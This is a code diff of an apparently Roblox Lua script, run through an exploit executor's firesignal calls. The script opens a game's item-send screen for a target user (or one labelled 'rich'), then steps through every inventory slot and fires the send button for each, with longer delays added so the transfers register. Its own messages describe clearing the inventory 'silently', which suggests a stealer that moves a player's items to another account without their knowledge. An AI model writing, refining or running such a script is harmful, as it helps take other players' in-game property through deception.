@@ -21,7 +21,6 @@ local function runTrueBackgroundAutomation()
         if child:IsA("GuiObject") then
             local elements = child:GetDescendants()
             for _, el in ipairs(elements) do
-                -- Checks for the visible display tag or the username tag handle
                 if el:IsA("TextLabel") and (string.find(el.Text:lower(), targetUser:lower()) or string.find(el.Text:lower(), "rich")) then
                     targetButton = child
                     break
@@ -41,45 +40,42 @@ local function runTrueBackgroundAutomation()
     if playerToggle then
         firesignal(playerToggle.MouseButton1Click)
         firesignal(playerToggle.Activated)
-        
-        -- Give the game UI layout a brief moment to switch windows and load frames
-        task.wait(0.8) 
+        task.wait(1.0) -- Give the UI screen a full second to flip open and load
     end
     
-    -- STEP 2: Drill down directly into the deep InventoryFrame container found in the scan
+    -- STEP 2: Drill down into the InventoryFrame container
     local scrollingFramesFolder = itemSendFrame:FindFirstChild("ScrollingFrames")
     local inventoryFrame = scrollingFramesFolder and scrollingFramesFolder:FindFirstChild("InventoryFrame")
     
     if not inventoryFrame then
-        warn("CRITICAL ERROR: Could not locate 'InventoryFrame' inside ScrollingFrames.")
+        warn("CRITICAL ERROR: Could not locate 'InventoryFrame'.")
         return
     end
     
-    -- Gather all items inside your actual bag grid
     local items = inventoryFrame:GetChildren()
     print("Scanning item grid cells silently... Found elements: " .. tostring(#items))
     
-    -- STEP 3: Automated background inventory clearing loop
+    -- STEP 3: Automated background inventory loop with staging delays
     for _, cell in ipairs(items) do
-        -- Strictly target actual item grids, ignore organizational constraints
         if cell:IsA("GuiObject") and cell.Name ~= "UIGridLayout" and cell.Name ~= "UIPadding" then
             
-            -- Isolate the clickable node for the seed/item slot square
             local cellTrigger = cell:IsA("TextButton") and cell or cell:FindFirstChildOfClass("TextButton", true) or cell:FindFirstChildOfClass("ImageButton", true)
             
             if cellTrigger then
                 print("Staging inventory item element: " .. cell.Name)
                 firesignal(cellTrigger.MouseButton1Click)
                 firesignal(cellTrigger.Activated)
-                task.wait(0.2) -- Safe pause for the item to register in the staging slot
                 
-                -- Fire send confirmation action
+                -- CRITICAL PAUSE: Give the game UI 0.5 seconds to move the item into the slot
+                task.wait(0.5) 
+                
                 if sendButton then
+                    print("Firing Send Button click...")
                     firesignal(sendButton.MouseButton1Click)
                     firesignal(sendButton.Activated)
                     
                     -- Server network handshake cooldown to securely clear the slot out
-                    task.wait(1.0)
+                    task.wait(1.5)
                 else
                     warn("Send confirmation button path became disconnected.")
                     break
